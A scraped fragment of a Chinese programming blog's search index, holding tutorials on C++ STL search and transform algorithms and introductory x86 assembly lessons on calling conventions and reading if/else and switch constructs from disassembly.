0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"常用的查找算法","slug":"cpp0090-常用的查找算法","date":"2021-07-24T18:33:46.000Z","updated":"2021-12-28T18:40:24.240Z","comments":true,"path":"2021/07/25/cpp0090-常用的查找算法/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/07/25/cpp0090-常用的查找算法/","excerpt":"","text":"adjacent_find() binary_search() binary_search() count() count_if() find() find_if() adjacent_find() 在iterator对标识元素范围内，查找一对相邻重复元素，找到则返回指向这对元素的第一个元素的迭代器。否则返回past-the-end。 1234567891011121314151617vector&lt;int&gt; vecInt;​ vecInt.push_back(1);​ vecInt.push_back(2);​ vecInt.push_back(2);​ vecInt.push_back(4);​ vecInt.push_back(5);vecInt.push_back(5); ​ vector&lt;int&gt;::iterator it = adjacent_find(vecInt.begin(), vecInt.end()); //*it == 2 binary_search 在有序序列中查找value,找到则返回true。注意：在无序序列中，不可使用。 123456789101112131415 set&lt;int&gt; setInt;​ setInt.insert(3);​ setInt.insert(1);​ setInt.insert(7);​ setInt.insert(5);​ setInt.insert(9); ​ bool bFind = binary_search(setInt.begin(),setInt.end(),5); count() 利用等于操作符，把标志范围内的元素与输入值比较，返回相等的个数。 1234567891011121314151617vector&lt;int&gt; vecInt;​ vecInt.push_back(1);​ vecInt.push_back(2);​ vecInt.push_back(2);​ vecInt.push_back(4);​ vecInt.push_back(2);​ vecInt.push_back(5);​ int iCount = count(vecInt.begin(),vecInt.end(),2); //iCount==3​ count_if() 假设vector&lt;int&gt; vecIntA，vecIntA包含1,3,5,7,9元素 1234567891011121314151617181920212223242526272829//先定义比较函数bool GreaterThree(int iNum)&#123;​ if(iNum&gt;=3)​ &#123;​ return true;​ &#125;​ else​ &#123;​ return false;​ &#125;&#125; int iCount = count_if(vecIntA.begin(), vecIntA.end(), GreaterThree);//此时iCount == 4 find() find: 利用底层元素的等于操作符，对指定范围内的元素与输入值进行比较。当匹配时，结束搜索，返回该元素的迭代器。 equal_range: 返回一对iterator，第一个表示lower_bound,第二个表示upper_bound。 123456789101112131415vector&lt;int&gt; vecInt;​ vecInt.push_back(1);​ vecInt.push_back(3);​ vecInt.push_back(5);​ vecInt.push_back(7);​ vecInt.push_back(9); vector&lt;int&gt;::iterator it = find(vecInt.begin(), vecInt.end(), 5); //*it == 5 find_if() find_if: 使用输入的函数代替等于操作符执行find。返回被找到的元素的迭代器。 假设vector&lt;int&gt; vecIntA，vecIntA包含1,3,5,3,9元素 vector&lt;int&gt;::it = find_if(vecInt.begin(),vecInt.end(),GreaterThree); 此时*it==3, *(it+1)==5, *(it+2)==3, *(it+3)==9 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;#include&lt;vector&gt;#include&lt;algorithm&gt;using namespace std;void test_adjacent_find()&#123; vector&lt;int&gt; v; v.push_back(0); v.push_back(1); v.push_back(2); v.push_back(3); v.push_back(3); v.push_back(5); //在iterator对标识元素范围内， //查找一对相邻重复元素，找到则返回指向这对元素的第一个元素的迭代器。否则返回past-the-end。 vector&lt;int&gt;::iterator it = adjacent_find(v.begin(), v.end()); cout &lt;&lt; \"*it: \" &lt;&lt; *it &lt;&lt; endl; //distance 返回迭代器it元素在v容器中的位置(索引) cout &lt;&lt; \"distance: \" &lt;&lt; distance(v.begin(),it) &lt;&lt; endl;&#125;void test_binary_search() &#123; vector&lt;int&gt; v; v.push_back(0); v.push_back(1); v.push_back(2); v.push_back(3); v.push_back(3); v.push_back(5); v.push_back(-1); //需要先排序 if (binary_search(v.begin(), v.end(), 5)) &#123; cout &lt;&lt; \"yes\" &lt;&lt; endl; &#125; else &#123; cout &lt;&lt; \"no\" &lt;&lt; endl; &#125; &#125;void test_count() &#123; vector&lt;int&gt; v; v.push_back(0); v.push_back(1); v.push_back(2); v.push_back(3); v.push_back(3); v.push_back(5); v.push_back(-1); cout &lt;&lt; \"count: \" &lt;&lt; count(v.begin(), v.end(), 3) &lt;&lt; endl;&#125;bool Com(int x) &#123; if (x &gt; 3) &#123; return true; &#125; return false;&#125;void test_countif() &#123; vector&lt;int&gt; v; v.push_back(0); v.push_back(1); v.push_back(2); v.push_back(3); v.push_back(3); v.push_back(5); v.push_back(-1); cout &lt;&lt; \"count_if: \" &lt;&lt; count_if(v.begin(), v.end(), Com) &lt;&lt; endl;&#125;void test_find() &#123; vector&lt;int&gt; v; v.push_back(0); v.push_back(1); v.push_back(2); v.push_back(3); v.push_back(3); v.push_back(5); v.push_back(-1); vector&lt;int&gt;::iterator it = find(v.begin(),v.end(),-1); cout &lt;&lt; \"*it: \" &lt;&lt; *it &lt;&lt; endl; cout &lt;&lt; \"distance: \" &lt;&lt; distance(v.begin(),it) &lt;&lt; endl;&#125;class ComP &#123;public: bool operator()(int x) &#123; if (x &gt; 3) &#123; return true; &#125; return false; &#125;private:&#125;;void test_findif() &#123; vector&lt;int&gt; v; v.push_back(0); v.push_back(1); v.push_back(2); v.push_back(3); v.push_back(3); v.push_back(5); v.push_back(-1); cout &lt;&lt; \"find_if: \" &lt;&lt; *(find_if(v.begin(), v.end(), ComP())) &lt;&lt; endl;&#125;int main(char *argv[], int argc)&#123; test_adjacent_find(); test_binary_search(); test_count(); test_countif(); test_find(); test_findif(); return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"foreach和transform算法","slug":"cpp0089-foreach和transform算法","date":"2021-07-24T15:28:16.000Z","updated":"2021-12-28T18:40:19.526Z","comments":true,"path":"2021/07/24/cpp0089-foreach和transform算法/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/07/24/cpp0089-foreach和transform算法/","excerpt":"","text":"foreach和transform算法 for_each() for_each(迭代器起始位置,迭代器结束位置,函数对象或回调函数) for_each: 用指定函数依次对指定范围内所有元素进行迭代访问。该函数不得修改序列中的元素。 for_each()会返回一个新的函数对象 一般情况下：for_each所使用的函数对象，参数是引用，没有返回值 123456789101112void show(const int &amp;iItem)&#123; cout &lt;&lt; iItem;&#125;main()&#123; int iArray[] = &#123;0,1,2,3,4&#125;; vector&lt;int&gt; vecInt(iArray,iArray+sizeof(iArray)/sizeof(iArray[0])); for_each(vecInt.begin(), vecInt.end(), show);//结果打印出0 1 2 3 4&#125; transform() transform: 与for_each类似，遍历所有元素，但可对容器的元素进行修改 transform(迭代器起始位置,迭代器结束位置,迭代器x起始位置,函数对象或回调函数) transform所使用的函数对象，参数一般不使用引用，而是还有返回值 1234567891011121314151617int increase (int i) &#123; return i+1; &#125; main() &#123; vector&lt;int&gt; vecIntA; vecIntA.push_back(1); vecIntA.push_back(3); vecIntA.push_back(5); vecIntA.push_back(7); vecIntA.push_back(9); transform(vecIntA.begin(),vecIntA.end(),vecIntA.begin(),increase); //vecIntA : &#123;2,4,6,8,10&#125; &#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188#include &lt;iostream&gt;using namespace std;#include &quot;string&quot;#include &lt;vector&gt;#include &lt;list&gt;#include &quot;set&quot;#include &lt;algorithm&gt;#include &quot;functional&quot;#include &quot;iterator&quot; //输出流迭代器的头文件void printV(vector&lt;int&gt; &amp;v)&#123; for (vector&lt;int&gt;::iterator it=v.begin(); it!=v.end(); it++) &#123; cout &lt;&lt; *it &lt;&lt; &quot; &quot;; &#125;&#125;void printList(list&lt;int&gt; &amp;v)&#123; for (list&lt;int&gt;::iterator it=v.begin(); it!=v.end(); it++) &#123; cout &lt;&lt; *it &lt;&lt; &quot; &quot;; &#125;&#125;void showElem(int &amp;n)&#123; cout &lt;&lt; n &lt;&lt; &quot; &quot;;&#125;class CMyShow&#123;public: CMyShow() &#123; num = 0; &#125; void operator()(int &amp;n) &#123; num ++; cout &lt;&lt; n &lt;&lt; &quot; &quot;; &#125; void printNum() &#123; cout &lt;&lt; &quot;num:&quot; &lt;&lt; num &lt;&lt; endl; &#125;protected:private: int num;&#125;;void main41_foreach()&#123; vector&lt;int&gt; v1; v1.push_back(1); v1.push_back(3); v1.push_back(5); printV(v1); cout &lt;&lt; endl; /* template&lt;class _InIt, class _Fn1&gt; inline _Fn1 for_each(_InIt _First, _InIt _Last, _Fn1 _Func) &#123; // perform function for each element _DEBUG_RANGE(_First, _Last); _DEBUG_POINTER(_Func); return (_For_each(_Unchecked(_First), _Unchecked(_Last), _Func)); &#125; */ //函数对象 回调函数入口地址 for_each(v1.begin(), v1.end(), showElem); cout &lt;&lt; endl; for_each(v1.begin(), v1.end(), CMyShow()); cout &lt;&lt; endl; CMyShow mya; CMyShow my1 = for_each(v1.begin(), v1.end(),mya); //给my1初始化 mya.printNum(); //ma1和my1 是两个不同的对象 my1.printNum(); my1 = for_each(v1.begin(), v1.end(),mya); //给my1赋值 my1.printNum();&#125;int increase(int i)&#123; return i+100;&#125;void main42_transform()&#123; vector&lt;int&gt; v1; v1.push_back(1); v1.push_back(3); v1.push_back(5); printV(v1); cout &lt;&lt; endl; //transform 使用回调函数 transform(v1.begin(), v1.end(), v1.begin(), increase ); printV(v1); cout &lt;&lt; endl; //transform 使用 预定义的函数对象 transform(v1.begin(), v1.end(), v1.begin(), negate&lt;int&gt;() ); printV(v1); cout &lt;&lt; endl; //transform 使用 函数适配器 和函数对象 list&lt;int&gt; mylist; mylist.resize( v1.size() ); transform(v1.begin(), v1.end(), mylist.begin(), bind2nd( multiplies&lt;int&gt;(), 10 ) ); printList(mylist); cout &lt;&lt; endl; //transform 也可以把运算结果 直接输出到屏幕 transform(v1.begin(), v1.end(), ostream_iterator&lt;int&gt;(cout, &quot; &quot; ), negate&lt;int&gt;() ); cout &lt;&lt; endl;&#125;//一般情况下：for_each所使用的函数对象，参数是引用，没有返回值//transform所使用的函数对象，参数一般不使用引用，而是还有返回值int showElem2(int n)&#123; cout &lt;&lt; n &lt;&lt; &quot; &quot;; return n;&#125;void main43_transform_pk_foreach()&#123; vector&lt;int&gt; v1; v1.push_back(1); v1.push_back(3); v1.push_back(5); vector&lt;int&gt; v2 = v1; for_each(v1.begin(), v1.end(), showElem); //transform 对 函数对象的要求 /*c:\\program files\\microsoft visual studio 10.0\\vc\\include\\algorithm(1119): 参见对正在编译的函数 模板 实例化 “_OutIt std::_Transform1&lt;int*,_OutIt, void(__cdecl *)(int &amp;)&gt;(_InIt,_InIt,_OutIt,_Fn1, std::tr1::true_type)”的引用1&gt; with1&gt; [1&gt; _OutIt=std::_Vector_iterator&lt;std::_Vector_val&lt;int,std::allocator&lt;int&gt;&gt;&gt;,1&gt; _InIt=int *,1&gt; _Fn1=void (__cdecl *)(int &amp;)1&gt; ] */ /* template&lt;class _InIt, class _OutIt, class _Fn1&gt; inline _OutIt _Transform(_InIt _First, _InIt _Last, _OutIt _Dest, _Fn1 _Func) &#123; // transform [_First, _Last) with _Func for (; _First != _Last; ++_First, ++_Dest) *_Dest = _Func(*_First); //解释了 为什么 要有返回值 return (_Dest); &#125; */ transform(v2.begin(), v2.end(), v2.begin(), showElem2);&#125;void main()&#123; //main41_foreach(); //main42_transform(); // main43_transform_pk_foreach(); cout&lt;&lt;&quot;hello...&quot;&lt;&lt;endl; system(&quot;pause&quot;); return ;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"23-30","slug":"hbnx003-23-30","date":"2021-07-15T15:33:34.000Z","updated":"2021-07-26T16:57:37.175Z","comments":true,"path":"2021/07/15/hbnx003-23-30/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/07/15/hbnx003-23-30/","excerpt":"","text":"知识点： CALL框架 EBP寄存器 栈底指针 ESP寄存器 栈顶指针 一、EBP栈底指针 EBP是一个特殊的寄存器，通过EBP+偏移量 可以访问CALL里边的局部变量。它的低16位叫BP。//EAX和AX的关系 二、ESP栈顶指针 ESP栈顶指针与EBP构成的一段空间大小，一般就是本CALL局部变量的空间大小总和。ESP指针配合EBP使用。//SP 三、代码分析 1234567891011121314151617181920212223242526272829void fun1(void)&#123; //0401000 /$ 55 PUSH EBP //保存栈环境或者叫保存EBP指针​ //0401001 |. 8BEC MOV EBP,ESP​ //0401003 |. 5D POP EBP //恢复EBP指针​ //0401004 \\. C3 RETN&#125;void fun2(void)&#123;​ int a;​ int b=5;&#125;void fun3(void)&#123;​ fun2();&#125; 总结： 1、每个CALL会分配一个独立的栈段空间，供局部变量使用. 栈段空间大小一般要大于局部变量所需空间大小之和 ebp-esp=栈段空间大小。 2、CALL栈平衡。进CALL前与出CALL后 EBP和ESP的值不变。 知识点： PUSH POP CALL堆栈平衡 RETN指令 一、PUSH入栈指令 (压栈指令): 格式: PUSH 操作数 //sub esp,4 ;mov [esp],EBP 操作数可以是寄存器，存储器，或者立即数 二、POP出栈指令 （弹栈指令) 格式：POP 操作数 //mov EBP,[esp] ;add esp,4 操作数是寄存器，或者存储器，不能是立即数 三、代码分析 1、测试PUSH和POP 与ESP栈顶指针的关系 2、CALL与ESP的关系 3、总结栈的特点(后进先出) [EBP-??] // 局部变量 [ EBP+??] //上一个CALL 局部变量，上一个CALL传入参数 CALL PUSH EIP RETN POP EIP 知识点： cdecl 函数调用约定 stdcall 函数调用约定 CALL堆栈平衡 配置属性–&gt; c/c++ --&gt;高级–&gt;调用约定 一、cdecl调用约定 VC++默认约定__cdecl 1、源代码 1234567int __cdecl add1(int a,int b)&#123;​ return a+b;&#125; 2、生成汇编代码 123456789101100401000 /$ 55 PUSH EBP00401001 |. 8BEC MOV EBP,ESP00401003 |. 8B45 08 MOV EAX,DWORD PTR SS:[EBP+8]00401006 |. 0345 0C ADD EAX,DWORD PTR SS:[EBP+C]00401009 |. 5D POP EBP0040100A \\. C3 RETN ; POP EIP 3、调用代码 123456789101112131415push bpush acall add1add esp,800401031 |. 6A 02 PUSH 2 ; 0012FF7C00401033 |. 6A 01 PUSH 100401035 |. E8 C6FFFFFF CALL stdcall_.00401000 ; __cdecl add10040103A |. 83C4 08 ADD ESP,8 ; RETN 8 二、stdcall调用约定 API函数约定 __stdcall 1、源代码 1234567 int __stdcall add2(int a,int b)&#123;​ return a+b;&#125; 2、生成汇编代码 123456789101100401010 /$ 55 PUSH EBP00401011 |. 8BEC MOV EBP,ESP00401013 |. 8B45 08 MOV EAX,DWORD PTR SS:[EBP+8]00401016 |. 0345 0C ADD EAX,DWORD PTR SS:[EBP+C]00401019 |. 5D POP EBP0040101A \\. C2 0800 RETN 8 ; RETN 8 //ADD ESP,8 3、调用代码 1234567891011push bpush acall add20040103D |. 6A 04 PUSH 4 ; 0012FF7C0040103F |. 6A 03 PUSH 300401041 |. E8 CAFFFFFF CALL stdcall_.00401010 ; __stdcall add2 PUSH 下一个EIP 知识点： fastcall 函数调用约定 CALL堆栈平衡 三、__fastcall 函数调用约定 直接用寄存器传递参数，由于寄存器相对于栈(存储器)速度要快上许多，所以这类的调用约定叫fastcall 1、源代码 1234567 int __fastcall add2(int a,int b)&#123;​ return a+b;&#125; 2、汇编代码 1234567891011121314151617181900401020 /$ 55 PUSH EBP00401021 |. 8BEC MOV EBP,ESP00401023 |. 83EC 08 SUB ESP,8 ; int a,b;00401026 |. 8955 F8 MOV DWORD PTR SS:[EBP-8],EDX ; b=edx00401029 |. 894D FC MOV DWORD PTR SS:[EBP-4],ECX ; a=ecx0040102C |. 8B45 FC MOV EAX,DWORD PTR SS:[EBP-4]0040102F |. 0345 F8 ADD EAX,DWORD PTR SS:[EBP-8]00401032 |. 8BE5 MOV ESP,EBP ; add esp,800401034 |. 5D POP EBP00401035 \\. C3 RETN 3、调用代码 1234500401096 |. BA 02000000 MOV EDX,20040109B |. B9 01000000 MOV ECX,1004010A0 |. E8 7BFFFFFF CALL fastcall.00401020 ; 3 一般超过两个参数,就会使用栈来存储其他参数 123456789101112131415161718192021222324252627282930313233int __fastcall add4(int a, int b,int c,int d,int e) &#123; return a + b + c + d + e;&#125;00F4112B . 6A 05 push 0x5 ; 002FF83800F4112D . 6A 04 push 0x400F4112F . 6A 03 push 0x300F41131 . BA 02000000 mov edx,0x200F41136 B9 db B900F41137 01 db 0100F41138 00 db 0000F41139 00 db 0000F4113A &gt; 00 db 00 ; 002FF83800F4113B . E8 80FFFFFF call ConsoleA.00F410C000F410C0 /$ 55 push ebp00F410C1 |. 8BEC mov ebp,esp00F410C3 |. 83EC 08 sub esp,0x800F410C6 |. 8955 F8 mov [local.2],edx00F410C9 |. 894D FC mov [local.1],ecx00F410CC |. 8B45 FC mov eax,[local.1]00F410CF |. 0345 F8 add eax,[local.2]00F410D2 |. 0345 08 add eax,[arg.1]00F410D5 |. 0345 0C add eax,[arg.2]00F410D8 |. 0345 10 add eax,[arg.3]00F410DB |. 8BE5 mov esp,ebp00F410DD |. 5D pop ebp00F410DE \\. C2 0C00 retn 0xC 知识点： if else 逆向还原代码 一、了解if else结构 123456789101112131415161718192021sub esp,800401029 |. 8B45 FC MOV EAX,DWORD PTR SS:[EBP-4]0040102C |. 3B45 F8 CMP EAX,DWORD PTR SS:[EBP-8]0040102F |. 7E 10 JLE SHORT ifelse01.00401041 //表示 else部分的开始00401031 |. 68 FC204000 PUSH ifelse01.004020FC ; /format = &quot;a&gt;b&quot;00401036 |. FF15 A0204000 CALL DWORD PTR DS:[&lt;&amp;MSVCR90.printf&gt;] ; \\printf0040103C |. 83C4 04 ADD ESP,40040103F |. EB 0E JMP SHORT ifelse01.0040104F //结合前边的 jle 401041 判断是否有else部分00401041 |&gt; 68 00214000 PUSH ifelse01.00402100 ; /format = &quot;b&gt;=a&quot;00401046 |. FF15 A0204000 CALL DWORD PTR DS:[&lt;&amp;MSVCR90.printf&gt;] ; \\printf0040104C |. 83C4 04 ADD ESP,4 二、逆向还原代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364 int a,b,c;//00401006 |. 68 F4204000 PUSH ifelse01.004020F4 ; /format = &quot;begin&quot;//0040100B |. FF15 A0204000 CALL DWORD PTR DS:[&lt;&amp;MSVCR90.printf&gt;] ; \\printf//00401011 |. 83C4 04 ADD ESP,4 printf(&quot;begin&quot;);//00401014 |. C745 FC 01000&gt;MOV DWORD PTR SS:[EBP-4],1//0040101B |. C745 F8 02000&gt;MOV DWORD PTR SS:[EBP-8],2//00401022 |. C745 F4 03000&gt;MOV DWORD PTR SS:[EBP-C],3 a=1,b=2,c=3;//00401029 |. 8B45 FC MOV EAX,DWORD PTR SS:[EBP-4]//0040102C |. 3B45 F8 CMP EAX,DWORD PTR SS:[EBP-8]//0040102F |. 7E 10 JLE SHORT ifelse01.00401041if (a&gt;b)&#123; //00401031 |. 68 FC204000 PUSH ifelse01.004020FC ; /format = &quot;a&gt;b&quot; //00401036 |. FF15 A0204000 CALL DWORD PTR DS:[&lt;&amp;MSVCR90.printf&gt;] ; \\printf //0040103C |. 83C4 04 ADD ESP,4 //0040103F |. EB 0E JMP SHORT ifelse01.0040104F printf(&quot;a&gt;b&quot;);&#125;else&#123; //00401041 |&gt; 68 00214000 PUSH ifelse01.00402100 ; /format = &quot;b&gt;=a&quot; //00401046 |. FF15 A0204000 CALL DWORD PTR DS:[&lt;&amp;MSVCR90.printf&gt;] ; \\printf //0040104C |. 83C4 04 ADD ESP,4 printf(&quot;b&gt;=a&quot;);&#125;//0040104F |&gt; \\8B4D F4 MOV ECX,DWORD PTR SS:[EBP-C] ; c//00401052 |. 3B4D F8 CMP ECX,DWORD PTR SS:[EBP-8] ; b//00401055 |. 7E 46 JLE SHORT ifelse01.0040109D ; if (c&gt;b)if (c&gt;b)&#123;//00401057 |. 8B55 F4 MOV EDX,DWORD PTR SS:[EBP-C] c//0040105A |. 3B55 FC CMP EDX,DWORD PTR SS:[EBP-4] a//0040105D |. 7E 20 JLE SHORT ifelse01.0040107F if (c&gt;a) &#123; //0040105F |. 8B45 FC MOV EAX,DWORD PTR SS:[EBP-4]//00401062 |. 50 PUSH EAX ; /&lt;%d&gt;//00401063 |. 8B4D F4 MOV ECX,DWORD PTR SS:[EBP-C] ; |//00401066 |. 51 PUSH ECX ; |&lt;%d&gt;//00401067 |. 8B55 F8 MOV EDX,DWORD PTR SS:[EBP-8] ; |//0040106A |. 52 PUSH EDX ; |&lt;%d&gt;//0040106B |. 8B45 F4 MOV EAX,DWORD PTR SS:[EBP-C] ; |//0040106E |. 50 PUSH EAX ; |&lt;%d&gt;//0040106F |. 68 08214000 PUSH ifelse01.00402108 ; |format = &quot;%d&gt;%d,%d&gt;%d&quot;//00401074 |. FF15 A0204000 CALL DWORD PTR DS:[&lt;&amp;MSVCR90.printf&gt;] ; \\printf//0040107A |. 83C4 14 ADD ESP,14 printf(&quot;%d&gt;%d,%d&gt;%d&quot;,c,b,c,a);//0040107D |. EB 1E JMP SHORT ifelse01.0040109D &#125;else &#123; //0040107F |&gt; 8B4D FC MOV ECX,DWORD PTR SS:[EBP-4]//00401082 |. 51 PUSH ECX ; /&lt;%d&gt;//00401083 |. 8B55 F4 MOV EDX,DWORD PTR SS:[EBP-C] ; |//00401086 |. 52 PUSH EDX ; |&lt;%d&gt;//00401087 |. 8B45 F8 MOV EAX,DWORD PTR SS:[EBP-8] ; |//0040108A |. 50 PUSH EAX ; |&lt;%d&gt;//0040108B |. 8B4D F4 MOV ECX,DWORD PTR SS:[EBP-C] ; |//0040108E |. 51 PUSH ECX ; |&lt;%d&gt;//0040108F |. 68 14214000 PUSH ifelse01.00402114 ; |format = &quot;%d&gt;%d,%d&lt;=%d&quot;//00401094 |. FF15 A0204000 CALL DWORD PTR DS:[&lt;&amp;MSVCR90.printf&gt;] ; \\printf//0040109A |. 83C4 14 ADD ESP,14 printf(&quot;%d&gt;%d,%d&lt;=%d&quot;,c,b,c,a); &#125;&#125;//0040109D |&gt; 33C0 XOR EAX,EAX 知识点： switch case生成的汇编框架 逆向汇编代码还原成C++代码 一、了解switch case结构 1、普通情况 12345678910111213141516171819202100401011 |. 83C4 04 ADD ESP,400401014 |. C745 FC 20000&gt;MOV DWORD PTR SS:[EBP-4],20 ; a=20;0040101B |. 8B45 FC MOV EAX,DWORD PTR SS:[EBP-4]0040101E |. 8945 F8 MOV DWORD PTR SS:[EBP-8],EAX ; switch (a)00401021 |. 837D F8 03 CMP DWORD PTR SS:[EBP-8],3 ; case 3:00401025 |. 74 0E JE SHORT switchCa.0040103500401027 |. 837D F8 04 CMP DWORD PTR SS:[EBP-8],4 ; case 4:0040102B |. 74 28 JE SHORT switchCa.004010550040102D |. 837D F8 05 CMP DWORD PTR SS:[EBP-8],5 ; case 5:00401031 |. 74 12 JE SHORT switchCa.0040104500401033 |. EB 30 JMP SHORT switchCa.00401065 ; default: 2、跳转表 123456789101112131415161718192021222300401014 |. C745 FC 20000&gt;MOV DWORD PTR SS:[EBP-4],20 ; a=20;0040101B |. 8B45 FC MOV EAX,DWORD PTR SS:[EBP-4]0040101E |. 8945 F8 MOV DWORD PTR SS:[EBP-8],EAX ; b=a00401021 |. 8B4D F8 MOV ECX,DWORD PTR SS:[EBP-8] ; b==100401024 |. 83E9 03 SUB ECX,3 ; a-0x3=跳转表数组大小 ecx = a - 最小case值00401027 |. 894D F8 MOV DWORD PTR SS:[EBP-8],ECX0040102A |. 837D F8 0E CMP DWORD PTR SS:[EBP-8],0E ; 0E=case最大常量-case最小常量0040102E |. 77 61 JA SHORT switchCa.00401091 ; default:00401030 |. 8B55 F8 MOV EDX,DWORD PTR SS:[EBP-8] ;edx == local.1 == ecx == a - case最小值00401033 |. 0FB682 CC1040&gt;MOVZX EAX,BYTE PTR DS:[EDX+4010CC] ; 跳转表的索引数组0040103A |&gt; FF2485 B41040&gt;JMP DWORD PTR DS:[EAX*4+4010B4] ; /跳转表 二、逆向还原代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111//00401003 |. 83EC 08 SUB ESP,8 ; int a,b//00401006 |. 68 F4204000 PUSH switchCa.004020F4 ; /format = &quot;begin\\n&quot;//0040100B |. FF15 A4204000 CALL DWORD PTR DS:[&lt;&amp;MSVCR90.printf&gt;] ; \\printf//00401011 |. 83C4 04 ADD ESP,4 ; a=20//00401014 |. C745 FC 20000&gt;MOV DWORD PTR SS:[EBP-4],20 ; switch (a)//0040101B |. 8B45 FC MOV EAX,DWORD PTR SS:[EBP-4]//0040101E |. 8945 F8 MOV DWORD PTR SS:[EBP-8],EAX//00401021 |. 8B4D F8 MOV ECX,DWORD PTR SS:[EBP-8]//00401024 |. 83E9 09 SUB ECX,9 ; 23//00401027 |. 894D F8 MOV DWORD PTR SS:[EBP-8],ECX//0040102A |. 837D F8 08 CMP DWORD PTR SS:[EBP-8],8 ; 9..17//0040102E |. 77 4A JA SHORT switchCa.0040107A ; 9,11,15,16,17//00401030 |. 8B55 F8 MOV EDX,DWORD PTR SS:[EBP-8]//00401033 |. FF2495 9C1040&gt;JMP DWORD PTR DS:[EDX*4+40109C] ; 跳转表//0040103A |&gt; 68 FC204000 PUSH switchCa.004020FC ; /format = &quot;aaa&quot;//0040103F |. FF15 A4204000 CALL DWORD PTR DS:[&lt;&amp;MSVCR90.printf&gt;] ; \\printf//00401045 |. 83C4 04 ADD ESP,4//00401048 |. EB 3E JMP SHORT switchCa.00401088//0040104A |&gt; 68 00214000 PUSH switchCa.00402100 ; /format = &quot;aaaa&quot;//0040104F |. FF15 A4204000 CALL DWORD PTR DS:[&lt;&amp;MSVCR90.printf&gt;] ; \\printf//00401055 |. 83C4 04 ADD ESP,4//00401058 |. EB 2E JMP SHORT switchCa.00401088//0040105A |&gt; 68 08214000 PUSH switchCa.00402108 ; /format = &quot;bbbb&quot;//0040105F |. FF15 A4204000 CALL DWORD PTR DS:[&lt;&amp;MSVCR90.printf&gt;] ; \\printf//00401065 |. 83C4 04 ADD ESP,4//00401068 |. EB 1E JMP SHORT switchCa.00401088//0040106A |&gt; 68 10214000 PUSH switchCa.00402110 ; /format = &quot;xxxx&quot;//0040106F |. FF15 A4204000 CALL DWORD PTR DS:[&lt;&amp;MSVCR90.printf&gt;] ; \\printf//00401075 |. 83C4 04 ADD ESP,4//00401078 |. EB 0E JMP SHORT switchCa.00401088//0040107A |&gt; 68 18214000 PUSH switchCa.00402118 ; /format = &quot;3333&quot;//0040107F |. FF15 A4204000 CALL DWORD PTR DS:[&lt;&amp;MSVCR90.printf&gt;] ; \\printf //Default//00401085 |. 83C4 04 ADD ESP,4//00401088 |&gt; 68 20214000 PUSH switchCa.00402120 ; /command = &quot;pause&quot;//0040108D |. FF15 9C204000 CALL DWORD PTR DS:[&lt;&amp;MSVCR90.system&gt;] ; \\system//00401093 |. 83C4 04 ADD ESP,4​ printf(&quot;begin&quot;);​ int a=0x20;​ switch(a)​ &#123; ​ case 11:​ printf(&quot;aaa&quot;);​ break;​ case 15:​ printf(&quot;aaaa&quot;);​ break;​ case 17:​ printf(&quot;bbbb&quot;);​ break;​ case 9:​ printf(&quot;xxxx&quot;);​ break; ​ default:​ printf(&quot;3333&quot;);​ break;​ &#125; ## 知识点： 入口函数main的定位 逆向汇编代码还原成C++代码 索引表数组 跳转表 设置程序的入口基址 最少要大于等于0x10000 找入口main函数 双击进入就是main函数的入口位置了 一、索引表及跳转表分析 1、确定case常量 18,20,28,32 2、确定case常量顺序 (可以根据 跳转表 调整也可以) 000210AC 00021063 30.00021063 18 000210B0 00021053 30.00021053 20 000210B4 00021048 30.00021048 28 000210B8 00021089 30.00021089 32 **// 调整后实际上就是按地址大小排序 ** 000210B4 00021048 30.00021048 28 000210B0 00021053 30.00021053 20 000210AC 00021063 30.00021063 18 000210B8 00021089 30.00021089 32 二、还原代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455printf(&quot;begin&quot;);​ int a,b; a=0x16; b=3;​ switch(a)​ &#123;​ case 28:​ b=b+a;​ break;​ case 20:​ printf(&quot;123&quot;);​ break;​ //18,20,28,32​ case 18:​ if (b&gt;9)​ &#123;​ printf(&quot;3333&quot;);​ &#125;else​ &#123;​ printf(&quot;2222&quot;);​ &#125;​ break; ​ case 32:​ printf(&quot;321&quot;);​ //break;​ default:​ printf(&quot;00end&quot;);​ break;​ &#125;​ //end","categories":[{"name":"汇编逆向","slug":"汇编逆向","permalink":"https://xiaowuyoucy.github.io/categories/汇编逆向/"}],"tags":[]},{"title":"13-22","slug":"hbnx002-13-22","date":"2021-07-14T14:57:46.000Z","updated":"2021-07-16T19:38:51.223Z","comments":true,"path":"2021/07/14/hbnx002-13-22/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/07/14/hbnx002-13-22/","excerpt":"","text":"知识点： 条件转移指令JNE/JNZ ZF（零标志） 不等于转移指令 JNE/JNZ (等于JE/JZ) 1、 JNE/JNZ功能 条件转移指令JNE/JNZ //不等于转移 格式: JNE/JNZ 标号 功能: ZF＝0,转至标号地址处执行 2、代码测试 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667 printf(&quot;begin\\n&quot;);​ int a=4;​ //if (a==3) //ZF=0​ //&#123;​ // printf(&quot;未跳转ZF==1\\n&quot;);​ //&#125;​ //printf(&quot;ZF==0跳转\\n&quot;);​ __asm​ &#123; mov eax,3​ sub eax,a //3-4​ jz end; //ZF=1​ &#125;​ 